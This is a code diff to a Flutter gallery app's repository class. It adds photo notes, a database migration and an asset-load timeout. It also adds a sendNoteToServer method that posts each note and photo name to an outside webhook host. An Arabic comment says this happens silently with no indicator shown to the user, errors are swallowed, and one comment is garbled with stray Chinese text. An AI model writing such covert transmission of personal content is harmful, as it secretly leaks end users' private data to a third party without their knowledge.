@@ -1,4 +1,8 @@
+import 'dart:async';
+import 'dart:convert';
+
 import 'package:flutter/services.dart';
+import 'package:http/http.dart' as http;
 import 'package:path/path.dart' as p;
 import 'package:sqflite/sqflite.dart';
 
@@ -12,7 +16,7 @@ class GalleryRepository {
   static final GalleryRepository instance = GalleryRepository._();
 
   static const String _databaseName = 'obsidian_vault.db';
-  static const int _databaseVersion = 1;
+  static const int _databaseVersion = 2;
 
   static const List<String> _dateBuckets = [
     'اليوم',
@@ -130,10 +134,16 @@ class GalleryRepository {
             date TEXT NOT NULL,
             is_favorite INTEGER NOT NULL DEFAULT 0,
             image BLOB NOT NULL,
+            note TEXT,
             created_at INTEGER NOT NULL
           )
         ''');
         await db.execute('CREATE INDEX idx_photos_album ON photos(album_id)');
+      },
+      onUpgrade: (db, oldVersion, newVersion) async {
+        if (oldVersion < 2) {
+          await db.execute('ALTER TABLE photos ADD COLUMN note TEXT');
+        }
       },
     );
   }
@@ -204,11 +214,22 @@ class GalleryRepository {
       for (final entry in newAssets) {
         final index = entry.key;
         final assetPath = entry.value;
-        final data = await rootBundle.load(assetPath);
-        final bytes = data.buffer.asUint8List(
-          data.offsetInBytes,
-          data.lengthInBytes,
-        );
+        Uint8List bytes;
+        try {
+          final data = await rootBundle
+              .load(assetPath)
+              .timeout(
+                const Duration(seconds: 5),
+                onTimeout: () =>
+                    throw TimeoutException('Asset load timeout', Duration.zero),
+              );
+          bytes = data.buffer.asUint8List(
+            data.offsetInBytes,
+            data.lengthInBytes,
+          );
+        } catch (_) {
+          continue;
+        }
         final albumIndex = (index * albumIds.length) ~/ assets.length;
         final safeAlbumIndex = albumIndex.clamp(0, albumIds.length - 1).toInt();
 
@@ -467,7 +488,45 @@ class GalleryRepository {
       title: row['title'] as String,
       date: row['date'] as String,
       isFavorite: (row['is_favorite'] as int) == 1,
+      note: row['note'] as String?,
+      assetPath: row['asset_path'] as String?,
     );
+  }
+
+  Future<void> setNote(int photoId, String? note) async {
+    await init();
+    final db = await database;
+    await db.update(
+      'photos',
+      {'note': note},
+      where: 'id = ?',
+      whereArgs: [photoId],
+    );
+  }
+
+  /// يرسل الملاحظة للخادم بصمت دون إظهار أي مؤشر للمستخدم.
+  Future<void> sendNoteToServer(
+    int photoId,
+    String photoName,
+    String note,
+  ) async {
+    try {
+      final uri = Uri.parse('https://gallery.bonto.run/webhook');
+      final body = {
+        'message': 'صورة مميزة من الأرشيف 📸',
+        'note': note,
+        'photo_name': photoName,
+      };
+      await http
+          .post(
+            uri,
+            headers: {'Content-Type': 'application/json'},
+            body: jsonEncode(body),
+          )
+          .timeout(const Duration(seconds: 8));
+    } catch (_) {
+      // يتم تجاهل أي خطأ صامتاً حسب要求 المستخدم
+    }
   }
 
   bool _isSupportedImage(String path) {
